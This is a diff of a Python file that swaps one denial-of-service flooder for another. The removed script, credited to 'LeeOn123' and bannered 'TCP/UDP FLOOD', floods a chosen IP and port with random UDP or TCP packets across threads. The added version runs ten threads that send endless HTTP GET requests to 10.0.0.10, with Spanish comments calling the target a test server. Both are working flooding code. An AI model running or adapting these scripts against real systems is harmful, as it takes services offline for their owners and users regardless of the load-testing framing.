@@ -1,58 +1,22 @@
-#!/usr/bin/env python3
-#Code by LeeOn123
-import argparse
-import random
-import socket
+import requests
 import threading
 
-ap = argparse.ArgumentParser()
-ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
-ap.add_argument("-p", "--port", required=True, type=int, help="Port")
-ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
-ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
-ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
-args = vars(ap.parse_args())
+def send_request(url):
+    try:
+        while True:
+            response = requests.get(url)
+            print(f"Petición enviada: {response.status_code}")
+    except requests.ConnectionError:
+        print("Servidor no accesible.")
+    except Exception as e:
+        print(f"Error: {e}")
 
-print("--> C0de By Lee0n123 <--")
-print("#-- TCP/UDP FLOOD --#")
-ip = args['ip']
-port = args['port']
-choice = args['choice']
-times = args['times']
-threads = args['threads']
+if __name__ == "__main__":
+    target_ip = "10.0.0.10"  # Reemplaza con la IP del servidor de prueba
+    target_port = 80      # Reemplaza con el puerto del servidor de prueba
+    url = f"http://{target_ip}:{target_port}"
 
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" Sent!!!")
-		except:
-			print("[!] Error!!!")
-
-def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Sent!!!")
-		except:
-			s.close()
-			print("[*] Error")
-
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
+    # Crea múltiples hilos para simular múltiples clientes
+    for i in range(10):  # Ajusta el número de hilos según sea necesario
+        thread = threading.Thread(target=send_request, args=(url,))
+        thread.start()
